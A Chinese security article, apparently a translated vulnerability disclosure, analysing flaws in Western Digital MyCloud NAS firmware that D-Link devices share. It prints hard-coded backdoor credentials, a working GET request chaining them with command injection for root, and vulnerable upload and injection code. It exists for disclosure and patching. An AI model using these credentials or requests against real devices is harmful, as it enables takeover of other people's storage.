@@ -1,0 +1,57 @@
+*本文中涉及到的相关漏洞已报送厂商并得到修复，本文仅限技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担。
+近日，GulfTech公司安全研究员James Bercegay发现，西部数据（Western Digital）旗下多个MyCloud系列网络存储设备（WDMyCloud NAS）存在未限制文件上传、硬编码后门、CSRF、命令注入等多个高危漏洞，攻击者可以利用这些漏洞，对MyCloud NAS设备植入恶意代码，远程登录或获得设备控制权限（漏洞利用exploit）。而且，WDMyCloud竟然还与D-Link存在代码共用情况！
+漏洞概述和受影响设备
+西部数据MyCloud系列（WDMyCloud ）广泛应用于个人和商业机构，可以算是一款非常畅销的云存储设备，用它可以实现电子文档托管并能形成云端和基于web的服务同步。
+漏洞公开日期: 2018-01-04 最新编辑日期: 2018-01-08 受影响厂商: Western Digital MyCloud 受影响设备型号: MyCloud、MyCloudMirror、My Cloud Gen 2、My Cloud PR2100、 My Cloud PR4100、My Cloud EX2 Ultra、My Cloud EX2、My Cloud EX4、My Cloud EX2100、My Cloud EX4100、My Cloud DL2100、My Cloud DL4100 不受影响设备型号： MyCloud 04.X Series、 MyCloud 2.30.174
+漏洞分析
+未限制文件上传漏洞
+WDMyCloud在以下位置存在未限制文件上传漏洞：
+/usr/local/modules/web/pages/jquery/uploader/multi_uploadify.php
+主要原因在于，开发者在此处对PHP gethostbyaddr()函数的误用，PHP帮助手册对gethostbyaddr()函数的返回值作了以下说明：
+“执行成功则返回主机名；失败则原样输出（输出IP地址）；如果输入的格式不正常，则返回FALSE。”
+让我们来仔细看看导致该漏洞的代码，以下就是存在漏洞的"multi_uploadify.php"脚本问题，我会一一对相关问题代码作出解释。
+#问题1：这里可被攻击者控制的“Host”头被用来定义了一个远程认证服务，这本身就很糟糕，攻击者可以把它指定为某个被控制服务器的IP地址，而且，如果我们向它发送一个无效的“Host”头信息，根据PHP手册定义，它只会返回FALSE。
+$ip = gethostbyaddr($_SERVER['HTTP_HOST']); $name = $_REQUEST['name']; $pwd = $_REQUEST['pwd']; $redirect_uri = $_REQUEST['redirect_uri']; //echo $name ." ".$pwd." ".$ip;
+#问题2：根据上述假设，向其发送了无效“Host”头信息后，这里的$result值就会被设置为返回的FALSE
+$result = @stripslashes( @join( @file( "http://".$ip."/mydlink/mydlink.cgi? cmd=1&name=".$name."=&pwd=".$pwd ),"" ));
+#问题3: 而且，程序会搜索以下这个空的存储结构，最终，其strstr()值会被设置为返回的FALSE。
+$result_1 = strstr($result,"0"); $result_1 = substr ($result_1, 0,28);
+#问题4: 这里被调用的strncmp()比较奇怪，它像是在寻找一个特定的登录失效状态，所以当执行出错或意外时，它不会给出具体解释，因此，这个if语句总是被忽略。
+if (strncmp ($result_1,"0",28) == 0 ) //if (strstr($result,"0")== 0 ) { header("HTTP/1.1 302 Found"); header("Location: ".$redirect_uri."?status=0"); exit(); }
+#问题5: 综上所述，所有检查认证机制都会被绕过，攻击者可以利用这种绕过机制，实现向NAS设备上传任意文件。其它代码在此就不作过多说明，但一旦用户验证机制被绕过，就会成功实现文件上传。
+利用这些问题，可以非常容易地获得一个远程root访问权限shell，攻击者可以使用参数"Filedata[0]"，向NAS设备发送一个包含上传文件的POST请求，"Filedata[0]"中包含了文件上传的具体目录位置，以及一个假冒的“Host”头信息。
+在后续的漏洞利用Metasploit模块中，实现了向NAS设备目录 "/var/www/"上传一个PHP网马的功能，一旦成功上传，该网马可以形成一个有效的网页后门，能加载后续攻击载荷。
+硬编码后门漏洞
+在发现上述文件上传漏洞后，我决定对其网络接口界面下的CGI二进制文件作个逆向分析，由于这些CGI文件是标准的Linux ELF可执行程序，相对容易分析，经过一个多小时的折腾，我偶然发现了以下文件：
+/usr/local/modules/cgi/nas_sharing.cgi
+上述文件可以通过访问 "/cgi-bin/nas_sharing.cgi"获得，除“cmd”参数被设置为“7”之外，其它各种访问方式都会产生服务器错误，这激发了我的挖掘兴趣。最终我发现这种错误在于代码问题上，但当我在分析错误的过程中，碰巧又发现了以下用于认证远程用户的函数。
+以下是从二进制反汇编中创建的伪代码，为了更好地识别，我把它重命名为"re_BACKDOOR"：
+struct passwd *__fastcall re_BACKDOOR(const char *a1, const char *a2) { const char *v2; // r5@1 const char *v3; // r4@1 struct passwd *result; // r0@4 FILE *v5; // r6@5 struct passwd *v6; // r5@7 const char *v7; // r0@9 size_t v8; // r0@10 int v9; // [sp+0h] [bp-1090h]@1 char s; // [sp+1000h] [bp-90h]@1 char dest; // [sp+1040h] [bp-50h]@1 v2 = a2; v3 = a1; memset(&s, 0, 0x40u); memset(&dest, 0, 0x40u); memset(&v9, 0, 0x1000u); if ( *v2 ) { v8 = strlen(v2); _b64_pton(v2, (u_char *)&v9, v8); if ( dword_2C2E4 ) { sub_1194C((const char *)&unk_1B1A4, v2); sub_1194C("pwd decode[%s]
+", &v9); } } if (!strcmp(v3, "mydlinkBRionyg") && !strcmp((const char *)&v9, "abc12345cba") ) { result = (struct passwd *)1; } else { v5 = (FILE *)fopen64("/etc/shadow", "r"); while ( 1 ) { result = fgetpwent(v5); v6 = result; if ( !result ) break; if ( !strcmp(result->pw_name, v3) ) { strcpy(&s, v6->pw_passwd); fclose(v5); strcpy(&dest, (const char *)&v9); v7 = (const char *)sub_1603C(&dest, &s); return (struct passwd *)(strcmp(v7, &s) == 0); } } } return result; }
+仔细观察上述代码，可以发现其中竟然包含了一个用户名密码为mydlinkBRionyg/abc12345cba的管理员用户，可以用它实现对目标NAS设备的远程登录，这是多么经典的一个硬编码后门啊！而且该用户名"mydlinkBRionyg"貌似与文件上传漏洞中的代码"mydlink.cgi"字段相关，而且其中还包含了"dlink"，难道是D-Link吗？我们后续分析。
+首先，一般来说，要利用这个后门来作点文章好像很难，因为只有在“7”模式下才不会发生错误，而且该模式下我们也仅能下载/mnt/目录下的文件，它并不是root权限，所以非得需要root权限才行。
+深入分析后，我发现CGI脚本每次一开始都会运行出错，只有在最后浏览器渲染解析阶段，CGI脚本才能正常运行，这貌似是由于开发者忘记在输出中指定具体的内容类型头，从而导致服务器端发生崩溃。现在的重点就是如何利用上述问题，实现root权限获取，所以在cmd参数为“51”的情况下，结合硬编码用户名密码后门，构造以下包含命令注入的请求，就能实现对远程NAS设备的访问控制。
+GET /cgi-bin/nas_sharing.cgi?dbg=1&cmd=51&user=mydlinkBRionyg&passwd=YWJjMT IzNDVjYmE&start=1&count=1;touch+/tmp/gulftech; HTTP/1.1
+利用该请求，攻击者可以获得对目标设备的root权限，执行任意命令。其中的密码字段是base64编码的，请求中我通过命令创建了一个位于/tmp/目录下的gulftech文件。这种漏洞利用姿势极具威胁性和传播性，即使是局域网内用户也无法保证安全，攻击者可以迷惑用户访问伪装为 "wdmycloud"和"wdmycloudmirror"名称，且内置有iframe或img标签的网站，然后向漏洞NAS设备发送一个GET请求，就能实现设备控制。具体利用方式如下所示：
+一旦用户访问该链接请求之后，其WDMyCloud设备就成了攻击者的“囊中之物”，由于硬编码后门的存在，用户唯一能做的缓解措施就是立即删除NAS设备中的数据。
+CSRF漏洞
+该漏洞利用方式可以是这种：
+也就是说，如果用户登录进入NAS设备之后，如果不小心点击了上述链接之后，将会执行整盘WDMyCloud的数据删除。
+命令注入
+2017年3月份是，Exploiteers安全团队曾发现了WDMyCloud的多个命令注入漏洞，但非常不可思议的是，我们又在其中发现了这种漏洞，以下就是存在漏洞的问题代码，有兴趣的可以深入研究一下。
+class RemoteBackupsAPI{ public function getRecoverItems() { $xmlPath = "/var/www/xml/rsync_recover_items.xml"; $jobName = $_REQUEST['jobName']; @unlink($xmlPath); $cmd = "rsyncmd -l \"$xmlPath\" -r \"$jobName\" >/dev/null"; system($cmd); if (file_exists($xmlPath)) { print file_get_contents($xmlPath); } else { print ""; } } }
+DoS漏洞
+攻击者可以滥用语言设置功能来触发对NAS设备WEB接口的DoS攻击，原因在于任意未授权用户可以设置设备用户的通用语言，以下是该功能的逆向二进制伪代码：
+int cgi_language() { int v1; // [sp+0h] [bp-10h]@1 cgiFormString("f_language", &v1, 8); xml_set_str((int)"/language", (int)&v1); xml_write_file("/etc/NAS_CFG/config.xml"); LIB_CP_Config_To_MTD(1); cgiHeaderContentType("text/html"); return system("language.sh > /dev/null 2>&1 &"); }
+从以上代码可知，攻击者在无需认证的情况下，可以对NAS设备设置任意使用语言，这种情况下，也就说明，可以随时切换任意语言设置，当然也对WEB接口的正常访问造成影响。如以下利用方式，其中7为把语言设置为韩语，总共有17种语言可设置。
+信息泄露
+在不需任意认证的情况下，攻击者可以利用以下请求方式获取设备用户相关的详细信息，
+GET /api/2.1/rest/users? HTTP/1.1
+WDMyCloud与D-Link的共用代码关系
+如前所述，“mydlink.cgi”文件引发了我对D-Link设备的联想，于是乎我通过Google搜索到了D-Link论坛内，某个D-Link DNS-320L ShareCenter设备用户发表的帖子，提及到了“mydlink.cgi”文件。
+经过我对D-Link DNS-320L ShareCenter设备的分析后发现，它竟然存在与 WDMyCloud完全相同的未授权文件上传和硬编码后门漏洞，GOD!，另外，还有多处拼写错误的函数名称和异常代码相当一致，这可以说明，它们在软件架构中共用了代码！
+但好在，与 WDMyCloud不同，升级版固件的D-Link DNS-320L已经不存了未授权文件上传和硬编码后门漏洞，其中，硬编码后门漏洞早在2014年7月的1.0.6升级固件版本中就已经被移除，如果你还没升级，就赶快的吧！
+非常搞笑，两家流行NAS设备大厂，竟然在2014年初和2014年底，共用同样的代码，导致存在同样的漏洞和后门！
+漏洞修复
+参照官方修复建议，尽快升级到WDMyCloud的2.30.174固件版本，但有些用户反映，该固件更新还未完全修复某些漏洞。
+*参考来源：gulftech，freebuf小编clouds编译，转载请注明来自FreeBuf.COM
